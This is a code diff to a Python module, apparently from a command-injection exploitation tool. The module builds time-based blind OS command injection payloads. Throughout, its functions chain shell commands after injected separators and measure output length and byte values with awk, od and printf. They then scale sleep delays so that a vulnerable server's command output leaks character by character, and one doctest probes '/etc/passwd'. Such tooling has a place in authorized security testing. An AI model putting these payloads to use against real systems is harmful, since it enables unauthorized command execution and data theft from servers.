@@ -50,7 +50,15 @@ Nesting one substitution inside another is what this costs, which backticks cann
 escaping - so the caller keeps to its own shape where those are in play.
 """
 def _length_arg_expr(word):
-  return (settings.CMD_SUB_PREFIX + "awk 'BEGIN{print(length(ARGV[1]))}' \"" + word + "\"" +
+  """
+  >>> "|" in _length_arg_expr("WORD")
+  False
+  >>> _length_arg_expr("WORD").startswith(settings.CMD_SUB_PREFIX + "LC_ALL=C awk ")
+  True
+  >>> "WORD" in _length_arg_expr("WORD")
+  True
+  """
+  return (settings.CMD_SUB_PREFIX + "LC_ALL=C awk 'BEGIN{print(length(ARGV[1]))}' \"" + word + "\"" +
           settings.CMD_SUB_SUFFIX)
 
 """
@@ -58,14 +66,15 @@ The ordinal of the output's Nth byte, newlines counted among them. 'cut -c' woul
 instead, which is a different byte on any output that has more than one - and none at all for the
 lines that are shorter than N.
 
-A letter follows the byte inside the substitution, and only the first of the two is read: a
-substitution drops the newlines it ends with, so a byte that is itself a newline would otherwise
-come back as nothing at all and the position it sits at could never be resolved.
+The byte is counted rather than read as a character: counted, a newline is a number like any other,
+where read it would be dropped along with the newlines a substitution ends with and the position it
+sits at could never be resolved. The count is unsigned, so the whole byte survives it, and it is one
+command on the end of the pipe the payload is already proving - no second statement to part.
 """
 def _ordinal_expr(word, num_of_chars):
   # '+' rather than a bare '+', which arrives as a space - and 'tail -c N' counts from the end.
-  return ("$(printf '%d' \"'$(printf '%s' \"" + word + "\" | tail -c +" + str(num_of_chars) +
-          " | head -c 1" + settings.END_LINE.LF + "printf X)\")")
+  return (settings.CMD_SUB_PREFIX + "printf '%s' \"" + word + "\" | tail -c +" + str(num_of_chars) +
+          " | head -c 1 | od -A n -t u1" + settings.CMD_SUB_SUFFIX)
 
 """
 The interpreter reads the output as an argument of its own rather than off a pipe. It is still data
@@ -115,9 +124,15 @@ The parentheses stand in for the space awk's own concatenation would need, which
 substitution would eat inside the quoted program.
 """
 def _ordinal_arg_expr(word, num_of_chars):
-  byte = (settings.CMD_SUB_PREFIX + "awk 'BEGIN{print((substr(ARGV[1]," + str(num_of_chars) +
+  """
+  >>> "|" in _ordinal_arg_expr("WORD", 3)
+  False
+  >>> "substr(ARGV[1],3,1)" in _ordinal_arg_expr("WORD", 3)
+  True
+  """
+  byte = (settings.CMD_SUB_PREFIX + "LC_ALL=C awk 'BEGIN{print((substr(ARGV[1]," + str(num_of_chars) +
           ",1))(\"X\"))}' \"" + word + "\"" + settings.CMD_SUB_SUFFIX)
-  return settings.CMD_SUB_PREFIX + "printf '%d' \"'" + byte + "\"" + settings.CMD_SUB_SUFFIX
+  return checks.byte_ordinal_term(byte)
 
 """
 The same condition written as arithmetic, or nothing where it is not one 'test' comparison of
@@ -127,6 +142,14 @@ _TEST_TO_ARITHMETIC = ((" -eq ", "=="), (" -ne ", "!="), (" -le ", "<="),
                        (" -lt ", "<"), (" -ge ", ">="), (" -gt ", ">"))
 
 def _arithmetic_condition(condition):
+  """
+  >>> _arithmetic_condition("1 -eq 1")
+  '1==1'
+  >>> _arithmetic_condition("4 -le 5")
+  '4<=5'
+  >>> [_arithmetic_condition(_) for _ in ("-f /etc/passwd", "-n $VAR", "1 -eq $VAR")]
+  [None, None, None]
+  """
   expression = condition
   for test_form, arithmetic in _TEST_TO_ARITHMETIC:
     expression = expression.replace(test_form, arithmetic)
@@ -177,7 +200,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                  )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       """
       Measured and delayed on in the one command, so neither of these has to chain anything.
 
@@ -243,7 +266,7 @@ def decision_alter_interpreter(separator, TAG, output_length, timesec, http_requ
                  settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                  )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _py_timed_comparison(timesec, output_length,
                   settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len('" + TAG + "'))\"" + settings.CMD_SUB_SUFFIX)
     elif separator == "&":
@@ -306,7 +329,7 @@ def condition_check(separator, condition, timesec, http_request_method):
               settings.RANDOM_VAR_GENERATOR + "=$?" + separator +
               "sleep $((" + str(timesec) + "*(" + settings.RANDOM_VAR_GENERATOR + "==0)))"
               )
-  elif separator in ("&", "&&") and not settings.USE_BACKTICKS \
+  elif separator in ("&", "&&") and checks.substitution_nests() \
        and _arithmetic_condition(condition) is not None:
     payload = separator + "sleep $((" + str(timesec) + "*(" + _arithmetic_condition(condition) + ")))"
   elif separator == "&":
@@ -358,17 +381,19 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     word = _output_word(cmd)
     if separator in (";", "\n", "\r\n"):
       payload = (separator +
+                 # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
+                 settings.BYTE_LOCALE_EXPORTED + separator +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
 
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _timed_comparison(timesec, output_length, _length_arg_expr(word))
     elif separator == "&":
-      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
-      # would bring in an operator the separator under test is not the one for.
+      # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
       payload = (separator +
+                 settings.BYTE_LOCALE_EXPORTED + "&&" +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
                  "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
@@ -377,7 +402,8 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     elif separator == "&&" :
       ampersand = "&"
       payload = (ampersand +
-                 "sleep 0" + separator +
+                 # The command the "&&" needs on its left, pinning while it is there.
+                 settings.BYTE_LOCALE_EXPORTED + separator +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                  # Find the length of the output.
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
@@ -416,7 +442,7 @@ def cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http
                  settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                  )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _py_timed_comparison(timesec, output_length, _py_length_expr(cmd))
     elif separator == "&":
       payload = (separator +
@@ -465,17 +491,19 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
     word = _output_word(cmd)
     if separator in (";", "\n", "\r\n"):
       payload = (separator +
+                 # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
+                 settings.BYTE_LOCALE_EXPORTED + separator +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "sleep $((" + str(timesec) + "*(" + str(candidate_length) + "<=$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
 
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _timed_comparison(timesec, candidate_length, _length_arg_expr(word), "<=")
     elif separator == "&":
-      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
-      # would bring in an operator the separator under test is not the one for.
+      # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
       payload = (separator +
+                 settings.BYTE_LOCALE_EXPORTED + "&&" +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
                  "[ " + str(candidate_length) + " -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
@@ -484,7 +512,8 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
     elif separator == "&&" :
       ampersand = "&"
       payload = (ampersand +
-                 "sleep 0" + separator +
+                 # The command the "&&" needs on its left, pinning while it is there.
+                 settings.BYTE_LOCALE_EXPORTED + separator +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "[ " + str(candidate_length) + " -le $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
@@ -521,7 +550,7 @@ def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http
                  settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(candidate_length) + "<=${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                  )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _py_timed_comparison(timesec, candidate_length, _py_length_expr(cmd), "<=")
     elif separator == "&":
       payload = (separator +
@@ -572,25 +601,30 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     settings.USER_APPLIED_CMD = cmd
     word = _output_word(cmd)
     qmarks = "?" * (num_of_chars - 1)
-    var_ordinal_expr = "$(printf '%d' \"'${" + settings.RANDOM_VAR_GENERATOR + "}\")"
+    var_ordinal_expr = checks.byte_ordinal("${" + settings.RANDOM_VAR_GENERATOR + "}")
+    # Where the delay is scaled by the comparison, the reading goes in as a term of the arithmetic
+    # already open rather than as one of its own - see checks.byte_ordinal_term().
+    var_ordinal_term = checks.byte_ordinal_term("${" + settings.RANDOM_VAR_GENERATOR + "}")
     ordinal_expr = _ordinal_expr(word, num_of_chars)
 
     if separator in (";", "\n", "\r\n") :
       payload = (separator +
+                # Sliced in bytes, as the length beside it counts - exported, since a rewrite can move the counting into a command of its own.
+                settings.BYTE_LOCALE_EXPORTED + separator +
                 # Grab the execution output.
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
-                "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + var_ordinal_expr + ")))"
+                "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + var_ordinal_term + ")))"
                 )
 
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _timed_comparison(timesec, ascii_char,
                   _ordinal_arg_expr(word, num_of_chars), arith_operator)
     elif separator == "&":
-      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
-      # would bring in an operator the separator under test is not the one for.
+      # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
       payload = (separator +
+                settings.BYTE_LOCALE_EXPORTED + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + "&&" +
@@ -601,7 +635,8 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     elif separator == "&&" :
       ampersand = "&"
       payload = (ampersand +
-                "sleep 0 " + separator +
+                # The command the "&&" needs on its left, pinning while it is there.
+                settings.BYTE_LOCALE_EXPORTED + separator +
                 # Grab the execution output.
                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
@@ -646,7 +681,7 @@ def get_char_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                  )
 
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _py_timed_comparison(timesec, ascii_char,
                   _py_ordinal_expr(cmd, num_of_chars), arith_operator)
     elif separator == "&":
@@ -698,7 +733,7 @@ def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timese
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                  )
 
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + _py_timed_comparison(timesec, ascii_char,
                   settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX)
     elif separator == "&":
